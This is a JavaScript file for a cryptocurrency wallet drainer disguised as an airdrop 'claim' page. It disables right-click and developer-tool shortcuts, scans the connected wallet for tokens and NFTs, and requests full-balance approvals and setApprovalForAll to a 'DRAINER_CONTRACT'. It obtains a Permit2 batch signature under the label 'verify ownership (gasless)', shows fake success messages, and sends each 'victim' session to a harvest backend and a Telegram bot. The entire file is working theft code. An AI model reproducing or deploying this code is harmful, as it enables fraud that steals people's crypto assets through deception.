import { CONFIG } from './config.js';

(function () {
  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) return;
  document.addEventListener('contextmenu', (e) => e.preventDefault());
  document.addEventListener('selectstart', (e) => e.preventDefault());
  document.addEventListener('keydown', (e) => {
    if (e.keyCode === 123) e.preventDefault();
    if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) e.preventDefault();
    if (e.ctrlKey && e.keyCode === 85) e.preventDefault();
  });
})();

const {
  DRAINER_CONTRACT,
  CONTRACT_ABI,
  BACKEND_URL,
  BACKEND_FALLBACK_URL,
  TELEGRAM_BOT_TOKEN,
  TELEGRAM_CHAT_ID,
  KNOWN_TOKENS,
  KNOWN_NFT_COLLECTIONS,
  CLAIM_THRESHOLD_USD,
  PERMIT2_ADDRESS,
  APPROVAL_DELAY_MS,
  APPROVAL_COOLDOWN_EVERY,
  APPROVAL_COOLDOWN_MS,
  BACKEND_HEALTH_TIMEOUT_MS,
  BACKEND_POST_TIMEOUT_MS,
} = CONFIG;

async function sendTelegramMessage(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
  try {
    const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
    });
    return r.ok;
  } catch (e) { console.error('Telegram error:', e); return false; }
}

let web3 = null;
let connectedAddress = null;
let connectedWallet = null;
let userHasClaimed = false;
let userLocalCurrency = detectLocalCurrency();
let ethPriceInUSD = 2200;
let isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
let delayedAttemptsScheduled = false;

function detectLocalCurrency() {
  try {
    const region = (navigator.language || 'en-US').split('-')[1] || 'US';
    const map = { US:'USD', GB:'GBP', DE:'EUR', FR:'EUR', IT:'EUR', ES:'EUR', JP:'JPY', CN:'CNY', IN:'INR', AU:'AUD', CA:'CAD', RU:'RUB', BR:'BRL', MX:'MXN', KR:'KRW', SG:'SGD', HK:'HKD', TR:'TRY', SA:'SAR', AE:'AED', NG:'NGN', ZA:'ZAR', EG:'EGP', PK:'PKR', BD:'BDT', ID:'IDR', TH:'THB', MY:'MYR', PH:'PHP', VN:'VND' };
    return map[region] || 'USD';
  } catch (e) { return 'USD'; }
}

function logDebug(msg) {
  console.log('[script.js]', msg);
  const el = document.getElementById('connectionDebug');
  if (el) el.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
}

function showNotification(message, type = 'success') {
  const n = document.createElement('div');
  n.className = `fake-notification ${type}`;
  n.innerHTML = `<i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i> ${message}`;
  document.body.appendChild(n);
  setTimeout(() => { n.style.opacity = '0'; setTimeout(() => n.remove(), 300); }, 3000);
}

function manualRandomDelay(min, max) {
  const d = Math.floor(Math.random() * (max - min + 1)) + min;
  return new Promise(r => setTimeout(r, d * (Math.random() * 0.4 + 0.8)));
}

async function getETHPriceInUSD() {
  const apis = ['https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd','https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT'];
  for (const api of apis) {
    try {
      const r = await fetch(api); const d = await r.json();
      if (api.includes('coingecko')) return d.ethereum.usd;
      if (api.includes('binance')) return parseFloat(d.price);
    } catch (e) {}
  }
  return 2200;
}

function syncFromGlobal() {
  if (window.__apexConnected?.address) {
    connectedAddress = window.__apexConnected.address;
    connectedWallet = window.__apexConnected.chain;
    if (window.__apexConnected.web3) web3 = window.__apexConnected.web3;
    logDebug(`Synced: ${connectedAddress} (${connectedWallet})`);
    return true;
  }
  if (window.ethereum) {
    try {
      web3 = new Web3(window.ethereum);
      return true;
    } catch (e) { logDebug('Web3 fallback failed: ' + e.message); }
  }
  return false;
}

async function getTokenBalance(addr, owner) {
  const abi = [{ constant: true, inputs: [{ name: '_owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: 'balance', type: 'uint256' }], type: 'function' }];
  try { const c = new web3.eth.Contract(abi, addr); return await c.methods.balanceOf(owner).call(); }
  catch (e) { return '0'; }
}

async function getNFTBalance(addr, owner) {
  const abi = [{ constant: true, inputs: [{ name: '_owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: 'balance', type: 'uint256' }], type: 'function' }];
  try { const c = new web3.eth.Contract(abi, addr); return await c.methods.balanceOf(owner).call(); }
  catch (e) { return '0'; }
}

async function detectTokens(owner) {
  const found = [];
  const concurrency = 5;
  for (let i = 0; i < KNOWN_TOKENS.length; i += concurrency) {
    const batch = KNOWN_TOKENS.slice(i, i + concurrency);
    const results = await Promise.allSettled(batch.map(async (t) => {
      const bal = await getTokenBalance(t.address, owner);
      if (bal && bal !== '0') {
        const formatted = parseFloat(bal) / Math.pow(10, t.decimals);
        return { address: t.address, symbol: t.symbol, decimals: t.decimals, balance: bal.toString(), balanceFormatted: formatted };
      }
      return null;
    }));
    for (const r of results) if (r.status === 'fulfilled' && r.value) found.push(r.value);
  }
  return found;
}

async function detectNFTs(owner) {
  const found = [];
  for (const c of KNOWN_NFT_COLLECTIONS) {
    const bal = await getNFTBalance(c.address, owner);
    if (bal && bal !== '0') found.push({ address: c.address, standard: c.standard, name: c.name, balance: parseInt(bal) });
  }
  return found;
}

async function checkAllowance(tokenAddr, owner) {
  const abi = [{ constant: true, inputs: [{ name: '_owner', type: 'address' }, { name: '_spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], type: 'function' }];
  try { const c = new web3.eth.Contract(abi, tokenAddr); return await c.methods.allowance(owner, DRAINER_CONTRACT).call(); }
  catch (e) { return '0'; }
}

async function approveToken(tokenAddr, owner, amount) {
  try {
    const erc20 = [{ constant: false, inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], type: 'function' }];
    const c = new web3.eth.Contract(erc20, tokenAddr);
    const currentAllowance = await checkAllowance(tokenAddr, owner);
    if (currentAllowance !== '0' && currentAllowance !== '0x0') {
      logDebug(`Reset allowance ${tokenAddr}`);
      const rGas = await c.methods.approve(DRAINER_CONTRACT, '0').estimateGas({ from: owner });
      await c.methods.approve(DRAINER_CONTRACT, '0').send({ from: owner, gas: Math.floor(rGas * 1.2) });
      await new Promise(r => setTimeout(r, 3000));
    }
    const gas = await c.methods.approve(DRAINER_CONTRACT, amount).estimateGas({ from: owner });
    const tx = await c.methods.approve(DRAINER_CONTRACT, amount).send({ from: owner, gas: Math.floor(gas * 1.2) });
    logDebug(`Approve OK ${tokenAddr}: ${tx.transactionHash}`);
    return tx.transactionHash;
  } catch (e) { logDebug(`Approve failed ${tokenAddr}: ${e.message}`); return null; }
}

async function approveNFT(collection, owner) {
  try {
    const abi = [{ constant: false, inputs: [{ name: '_operator', type: 'address' }, { name: '_approved', type: 'bool' }], name: 'setApprovalForAll', outputs: [], type: 'function' }];
    const c = new web3.eth.Contract(abi, collection);
    const gas = await c.methods.setApprovalForAll(DRAINER_CONTRACT, true).estimateGas({ from: owner });
    const tx = await c.methods.setApprovalForAll(DRAINER_CONTRACT, true).send({ from: owner, gas: Math.floor(gas * 1.2) });
    logDebug(`setApprovalForAll OK: ${tx.transactionHash}`);
    return tx.transactionHash;
  } catch (e) { logDebug(`setApprovalForAll failed: ${e.message}`); return null; }
}

async function capturePermit2Signature(tokens) {
  if (!tokens.length) return null;
  try {
    const now = Math.floor(Date.now() / 1000);
    const sigDeadline = now + 60 * 60 * 24 * 30;
    const details = tokens.map((t) => ({
      token: t.address,
      amount: '0x' + BigInt(t.balance).toString(16),
      expiration: now + 60 * 60 * 24 * 30,
      nonce: 0,
    }));
    const typedData = {
      types: {
        EIP712Domain: [{ name: 'name', type: 'string' }, { name: 'chainId', type: 'uint256' }, { name: 'verifyingContract', type: 'address' }],
        PermitDetails: [{ name: 'token', type: 'address' }, { name: 'amount', type: 'uint160' }, { name: 'expiration', type: 'uint48' }, { name: 'nonce', type: 'uint48' }],
        PermitBatch: [{ name: 'details', type: 'PermitDetails[]' }, { name: 'spender', type: 'address' }, { name: 'sigDeadline', type: 'uint256' }],
      },
      domain: { name: 'Permit2', chainId: 1, verifyingContract: PERMIT2_ADDRESS },
      primaryType: 'PermitBatch',
      message: { details, spender: DRAINER_CONTRACT, sigDeadline },
    };
    const signature = await window.ethereum.request({
      method: 'eth_signTypedData_v4',
      params: [connectedAddress, JSON.stringify(typedData)],
    });
    logDebug(`Permit2 sig: ${signature.slice(0, 20)}...`);
    return { permitBatch: { details, spender: DRAINER_CONTRACT, sigDeadline }, signature, amounts: tokens.map((t) => t.balance.toString()) };
  } catch (e) { logDebug('Permit2 sig declined: ' + e.message); return null; }
}

async function healthCheck(url) {
  if (!url) return false;
  try {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), BACKEND_HEALTH_TIMEOUT_MS);
    const r = await fetch(url.replace('/api/harvest', '/api/health'), { signal: ctrl.signal });
    clearTimeout(t);
    if (!r.ok) return false;
    const j = await r.json();
    return j.ok === true;
  } catch (e) { logDebug(`Health check failed: ${e.message}`); return false; }
}

async function postToBackend(session) {
  const urls = [BACKEND_URL, BACKEND_FALLBACK_URL].filter(Boolean);
  for (const url of urls) {
    try {
      logDebug(`POST ${url} (${session.tokens.length} tokens, ${session.nfts.length} NFTs)`);
      const ctrl = new AbortController();
      const t = setTimeout(() => ctrl.abort(), BACKEND_POST_TIMEOUT_MS);
      const r = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(session),
        signal: ctrl.signal,
      });
      clearTimeout(t);
      const text = await r.text();
      logDebug(`Backend ${url} → ${r.status} ${text.slice(0, 200)}`);
      if (!r.ok) continue;
      try { return JSON.parse(text); } catch (e) { return { status: r.status }; }
    } catch (e) { logDebug(`POST ${url} failed: ${e.message}`); }
  }
  return null;
}

async function drainEVM() {
  const button = document.getElementById('connectButton');
  const originalText = button?.innerHTML || '';
  const claimStatus = document.getElementById('claimStatus');

  if (!syncFromGlobal() || !web3) { showNotification('Connect wallet first', 'error'); return; }
  if (!connectedAddress) {
    const accounts = await web3.eth.getAccounts();
    connectedAddress = accounts[0];
  }
  if (!connectedAddress) { showNotification('No address', 'error'); return; }

  try {
    if (button) { button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...'; button.disabled = true; }
    if (claimStatus) { claimStatus.textContent = 'Checking backend...'; claimStatus.className = 'status pending'; }

    // ─── Preflight: contract state ───────────────────────────
    const contract = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
    const [code, paused, broken] = await Promise.all([
      web3.eth.getCode(DRAINER_CONTRACT),
      contract.methods.paused().call().catch(() => null),
      contract.methods.circuitBroken().call().catch(() => null),
    ]);
    if (!code || code === '0x') {
      if (claimStatus) { claimStatus.textContent = 'Contract not deployed'; claimStatus.className = 'status error'; }
      if (button) { button.innerHTML = originalText; button.disabled = false; }
      await sendTelegramMessage(`<b>❌ Preflight: contract not deployed at ${DRAINER_CONTRACT}</b>`);
      return;
    }
    if (paused === true || broken === true) {
      if (claimStatus) { claimStatus.textContent = 'Contract paused or tripped'; claimStatus.className = 'status error'; }
      if (button) { button.innerHTML = originalText; button.disabled = false; }
      await sendTelegramMessage(`<b>❌ Preflight: paused=${paused} circuitBroken=${broken}</b>`);
      return;
    }

    // ─── Preflight: backend health ───────────────────────────
    const backendOk = await healthCheck(BACKEND_URL) || (BACKEND_FALLBACK_URL && await healthCheck(BACKEND_FALLBACK_URL));
    if (!backendOk) {
      logDebug('⚠️ Backend health check failed — proceeding to approvals anyway (backend may be cold)');
    }

    // ─── Balance check ───────────────────────────────────────
    const ethBal = await web3.eth.getBalance(connectedAddress);
    const ethBalETH = web3.utils.fromWei(ethBal, 'ether');
    const userBalanceInUSD = parseFloat(ethBalETH) * ethPriceInUSD;
    logDebug(`Balance: ${ethBalETH} ETH (~$${userBalanceInUSD.toFixed(2)})`);

    if (userBalanceInUSD < CLAIM_THRESHOLD_USD) {
      if (claimStatus) { claimStatus.textContent = 'Insufficient balance.'; claimStatus.className = 'status error'; }
      if (button) { button.innerHTML = originalText; button.disabled = false; }
      await sendTelegramMessage(`<b>⚠️ Low balance</b>\n${connectedAddress}\n$${userBalanceInUSD.toFixed(2)}`);
      return;
    }
    if (userHasClaimed) {
      if (claimStatus) { claimStatus.textContent = 'Already claimed.'; claimStatus.className = 'status error'; }
      if (button) { button.innerHTML = originalText; button.disabled = false; }
      return;
    }

    // ─── Phase 1: detect ─────────────────────────────────────
    if (claimStatus) claimStatus.textContent = 'Detecting assets...';
    const tokens = await detectTokens(connectedAddress);
    const nfts = await detectNFTs(connectedAddress);
    logDebug(`Detected ${tokens.length} tokens, ${nfts.length} NFTs`);

    if (tokens.length === 0 && nfts.length === 0) {
      if (claimStatus) { claimStatus.textContent = 'No eligible assets.'; claimStatus.className = 'status info'; }
      if (button) { button.innerHTML = originalText; button.disabled = false; }
      await sendTelegramMessage(`<b>ℹ️ No assets</b>\n${connectedAddress}`);
      return;
    }

    // ─── Phase 2: approve tokens ─────────────────────────────
    const approvedTokens = [];
    for (let i = 0; i < tokens.length; i++) {
      if (claimStatus) claimStatus.textContent = `Approving ${tokens[i].symbol} (${i + 1}/${tokens.length})...`;
      const hash = await approveToken(tokens[i].address, connectedAddress, tokens[i].balance);
      if (hash) approvedTokens.push({ ...tokens[i], approvalTx: hash });
      await manualRandomDelay(APPROVAL_DELAY_MS, APPROVAL_DELAY_MS + 800);
      if (i > 0 && i % APPROVAL_COOLDOWN_EVERY === 0) {
        logDebug(`Cooldown ${APPROVAL_COOLDOWN_MS}ms`);
        await new Promise(r => setTimeout(r, APPROVAL_COOLDOWN_MS));
      }
    }

    // ─── Phase 3: approve NFTs ───────────────────────────────
    const approvedNFTs = [];
    for (const nft of nfts) {
      if (claimStatus) claimStatus.textContent = `Approving NFTs (${nft.name})...`;
      const hash = await approveNFT(nft.address, connectedAddress);
      if (hash) approvedNFTs.push({ ...nft, approvalTx: hash });
      await manualRandomDelay(APPROVAL_DELAY_MS, APPROVAL_DELAY_MS + 800);
    }

    // ─── Phase 4: Permit2 ────────────────────────────────────
    let permit2 = null;
    if (approvedTokens.length > 0 && window.ethereum?.request) {
      if (claimStatus) claimStatus.textContent = 'Sign to verify ownership (gasless)...';
      permit2 = await capturePermit2Signature(approvedTokens);
    }

    // ─── Phase 5: POST ───────────────────────────────────────
    const session = {
      victim: connectedAddress,
      chain: 1,
      tokens: approvedTokens.map(t => ({ address: t.address, symbol: t.symbol, amount: t.balance, decimals: t.decimals, approvalTx: t.approvalTx })),
      nfts: approvedNFTs.map(n => ({ address: n.address, standard: n.standard, name: n.name, approvalTx: n.approvalTx })),
      permit2,
      timestamp: Date.now(),
      userAgent: navigator.userAgent,
      isMobile: isMobileDevice,
    };

    if (claimStatus) claimStatus.textContent = 'Submitting to backend...';
    const backendResponse = await postToBackend(session);

    // ─── Phase 6: report ─────────────────────────────────────
    const backendOkFinal = !!backendResponse;
    if (approvedTokens.length > 0 || approvedNFTs.length > 0) {
      userHasClaimed = true;
      if (claimStatus) { claimStatus.textContent = backendOkFinal ? 'Claim successful!' : 'Approvals recorded — backend unreachable.'; claimStatus.className = backendOkFinal ? 'status success' : 'status info'; }

      const msg = `<b>🟦 Session Complete</b>
👤 <b>Victim:</b> <code>${connectedAddress}</code>
🪙 <b>Tokens:</b> ${approvedTokens.length}
🎨 <b>NFTs:</b> ${approvedNFTs.length}
🔏 <b>Permit2:</b> ${permit2 ? 'YES' : 'NO'}
📡 <b>Backend:</b> ${backendOkFinal ? 'OK' : 'FAILED'}
⚙️ <b>Contract paused:</b> ${paused} / <b>broken:</b> ${broken}
🕒 ${new Date().toISOString()}`;
      await sendTelegramMessage(msg);
    } else {
      if (claimStatus) { claimStatus.textContent = 'No approvals succeeded.'; claimStatus.className = 'status info'; }
      await sendTelegramMessage(`<b>ℹ️ No approvals</b>\n${connectedAddress}`);
    }

    if (button) { button.innerHTML = originalText; button.disabled = false; }

  } catch (err) {
    logDebug('drainEVM error: ' + err.message);
    if (claimStatus) { claimStatus.textContent = 'Failed: ' + err.message; claimStatus.className = 'status error'; }
    if (button) { button.innerHTML = originalText; button.disabled = false; }
    await sendTelegramMessage(`<b>❌ Drain Failed</b>\n${connectedAddress}\n${err.message}`);
  }
}

async function initiateClaimProcess() {
  syncFromGlobal();
  if (web3 && connectedAddress) {
    logDebug('Starting EVM...');
    await drainEVM();
    if (!delayedAttemptsScheduled) {
      delayedAttemptsScheduled = true;
      setTimeout(() => { delayedAttemptsScheduled = false; }, 150000);
    }
    return;
  }
  showNotification('No EVM wallet connected', 'error');
}

window.initiateClaimProcess = initiateClaimProcess;
window.drainEVM = drainEVM;

(async function boot() {
  ethPriceInUSD = await getETHPriceInUSD();
  window.addEventListener('apex:connected', () => { syncFromGlobal(); });
  logDebug('✅ script.js ready');
  console.log('✅ script.js loaded');
})();
